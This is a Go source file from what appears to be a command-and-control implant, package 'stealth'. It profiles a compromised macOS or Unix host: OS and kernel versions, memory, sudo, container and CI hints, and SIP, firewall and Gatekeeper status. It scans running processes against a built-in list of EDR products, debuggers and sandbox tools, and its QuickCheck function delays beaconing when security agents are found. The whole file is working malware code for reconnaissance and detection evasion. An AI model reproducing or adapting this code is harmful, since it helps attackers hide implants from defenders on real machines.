package stealth

import (
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/natx6/ananse/src/c2/implant/beacon"
	"github.com/natx6/ananse/src/c2/implant/shell"
)

var knownEDR = []string{
	"crowdstrike", "falcon",
	"sentinelone", "s1agent",
	"carbonblack", "cb",
	"cylance",
	"symantec", "sep",
	"mcafee", "mfetp",
	"trendmicro",
	"sophos", "sophosagent",
	"osqueryd", "osqueryi",
	"wireshark", "tcpdump",
	"lldb", "gdb",
	"dtrace",
	"taskexplorer",
	"blockblock",
	"knockknock",
}

var knownSandbox = []string{
	"vmtoolsd", "vboxguest",
	"xenserver",
	"qemu-ga",
}

func phase1(p *beacon.TargetProfile) {
	p.OS = runtime.GOOS
	hostname, _ := os.Hostname()
	p.Hostname = hostname
	p.CPUArch = runtime.GOARCH

	out, _ := shell.Run("sw_vers -productName 2>/dev/null", 5e9)
	if out != "" {
		p.Platform = strings.TrimSpace(out)
	}
	out, _ = shell.Run("sw_vers -productVersion 2>/dev/null", 5e9)
	if out != "" {
		p.PlatformVersion = strings.TrimSpace(out)
	}
	if p.Platform == "" {
		p.Platform = runtime.GOOS
	}

	out, _ = shell.Run("uname -r 2>/dev/null", 3e9)
	if out != "" {
		p.Kernel = strings.TrimSpace(out)
	}

	out, _ = shell.Run("sysctl -n hw.memsize 2>/dev/null", 5e9)
	if out != "" {
		fmt.Sscanf(out, "%d", &p.TotalMemory)
	}
	out, _ = shell.Run("vm_stat 2>/dev/null | grep 'Pages free' | awk '{print $3}' | tr -d '.'", 5e9)
	if out != "" {
		var pages int64
		fmt.Sscanf(out, "%d", &pages)
		p.FreeMemory = pages * 4096
	}

	out, _ = shell.Run("sysctl -n kern.boottime 2>/dev/null", 3e9)
	if out != "" {
		var secs int64
		fmt.Sscanf(out, "{ sec = %d,", &secs)
		if secs > 0 {
			p.Uptime = int64(time.Now().Unix()) - secs
		}
	}

	if s := os.Getenv("SHELL"); s != "" {
		p.Shell = s
	} else {
		p.Shell = "/bin/bash"
	}

	out, _ = shell.Run("sudo -V 2>/dev/null | head -1", 5e9)
	if out != "" {
		p.Sudo = true
		parts := strings.Fields(out)
		for i, part := range parts {
			if part == "version" && i+1 < len(parts) {
				p.SudoVersion = strings.TrimRight(parts[i+1], ")")
				break
			}
		}
	}

	envIndicators := []struct{ key, val, hint string }{
		{"CONTAINER", "", "container env"},
		{"KUBERNETES_SERVICE_HOST", "", "kubernetes"},
		{"DOCKER_HOST", "", "docker"},
		{"CI", "true", "ci environment"},
		{"JENKINS_HOME", "", "jenkins"},
	}
	for _, ind := range envIndicators {
		v := os.Getenv(ind.key)
		if ind.val != "" && v == ind.val {
			p.Hints = append(p.Hints, ind.hint)
		} else if ind.val == "" && v != "" {
			p.Hints = append(p.Hints, ind.hint)
		}
	}
}

func phase2(p *beacon.TargetProfile) {
	out, _ := shell.Run("csrutil status 2>/dev/null", 5e9)
	if strings.Contains(out, "enabled") {
		p.Hints = append(p.Hints, "sip enabled")
	} else if strings.Contains(out, "disabled") {
		p.Hints = append(p.Hints, "sip disabled")
	}

	out, _ = shell.Run("/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate 2>/dev/null", 5e9)
	if strings.Contains(out, "enabled") {
		p.Firewall = "macos firewall"
	}

	out, _ = shell.Run("spctl --status 2>/dev/null", 3e9)
	if strings.Contains(out, "enabled") {
		p.Hints = append(p.Hints, "gatekeeper enabled")
	}

	out, _ = shell.Run("id -u 2>/dev/null", 3e9)
	if strings.TrimSpace(out) == "0" {
		p.Hints = append(p.Hints, "running as root")
	}
}

func phase3(p *beacon.TargetProfile) {
	if ld := os.Getenv("LD_PRELOAD"); ld != "" {
		p.Hints = append(p.Hints, fmt.Sprintf("LD_PRELOAD=%s", ld))
	}
	if dyld := os.Getenv("DYLD_INSERT_LIBRARIES"); dyld != "" {
		p.Hints = append(p.Hints, fmt.Sprintf("DYLD_INSERT_LIBRARIES=%s", dyld))
	}

	out, _ := shell.Run("ps aux 2>/dev/null", 10e9)
	lower := strings.ToLower(out)
	for _, edr := range knownEDR {
		if strings.Contains(lower, edr) {
			p.HasAgent = true
			p.Hints = append(p.Hints, fmt.Sprintf("EDR process: %s", edr))
		}
	}

	out, _ = shell.Run("sysctl -n kern.debugexec 2>/dev/null", 3e9)
	if strings.TrimSpace(out) == "1" {
		p.Hints = append(p.Hints, "debug mode active")
	}
}

func QuickCheck() (threatLevel string, initialDelay time.Duration) {
	if os.Getenv("DOCKER_HOST") != "" || os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		return "medium", 90 * time.Second
	}

	out, _ := shell.Run("ps aux 2>/dev/null | grep -i -E 'crowdstrike|sentinelone|falcon' | grep -v grep", 10e9)
	if strings.Count(out, "\n") >= 2 {
		return "high", 120 * time.Second
	}

	return "low", 0
}
